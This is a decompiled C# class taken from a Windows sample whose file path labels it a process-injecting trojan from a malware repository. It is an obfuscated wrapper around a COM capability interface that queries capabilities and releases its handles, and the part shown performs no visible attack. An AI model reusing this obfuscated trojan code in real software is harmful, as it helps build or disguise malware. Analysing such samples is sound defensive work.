// Decompiled with JetBrains decompiler
// Type: s576252508539558.s564435305472145
// Assembly: s802785987160928, Version=1.0.0.0, Culture=neutral, PublicKeyToken=8d3bb6c79cff225a
// MVID: E562BAAF-678F-45B2-A19A-CFBF160B1BAF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\Trojan.Win64.Injects.byr-71d4abb6ea36ebfca83e1b236cadfd303a41fe6d642637197c630ec1263b20db.exe

using s272248484380978;
using s369920932296318;
using s767203895605925;
using System;
using System.Runtime.InteropServices;

namespace s576252508539558
{
  public sealed class s564435305472145 : IDisposable
  {
    private const int s779175448244480 = 0;
    private IProcessRecordRuntimeCapability s458361431321998;
    private bool s718103063199001;
    private IntPtr s426786612587341;

    internal s564435305472145(IntPtr module)
    {
      this.s426786612587341 = !(module == IntPtr.Zero) ? module : throw new ArgumentNullException(nameof (module));
      this.s458361431321998 = (IProcessRecordRuntimeCapability) s790454962121287.s920826227963306(this.s426786612587341);
    }

    public int s019465129099034(out Guid s558059029661647) => this.s458361431321998.GetCapabilityId(out s558059029661647);

    public int s529949299473179(out ushort[] s592012744115585, out ushort[] s514282407113997)
    {
      s592012744115585 = (ushort[]) null;
      s514282407113997 = (ushort[]) null;
      uint needed1 = 0;
      int capabilities;
      if ((capabilities = this.s458361431321998.GetCapabilities((ushort[]) null, (ushort[]) null, 0U, ref needed1)) == 0)
      {
        s592012744115585 = new ushort[(int) needed1];
        s514282407113997 = new ushort[(int) needed1];
        uint needed2 = 0;
        capabilities = this.s458361431321998.GetCapabilities(s592012744115585, s514282407113997, needed1, ref needed2);
      }
      return capabilities;
    }

    private void s681212882236621(bool s487432110264352)
    {
      if (this.s718103063199001)
        return;
      if (this.s458361431321998 != null)
        Marshal.ReleaseComObject((object) this.s458361431321998);
      if (this.s426786612587341 != IntPtr.Zero)
        s121277034860412.s207597635448262(this.s426786612587341);
      this.s718103063199001 = true;
    }

    ~s564435305472145() => this.s681212882236621(false);

    public void s960709549045837()
    {
      this.s681212882236621(true);
      GC.SuppressFinalize((object) this);
    }
  }
}
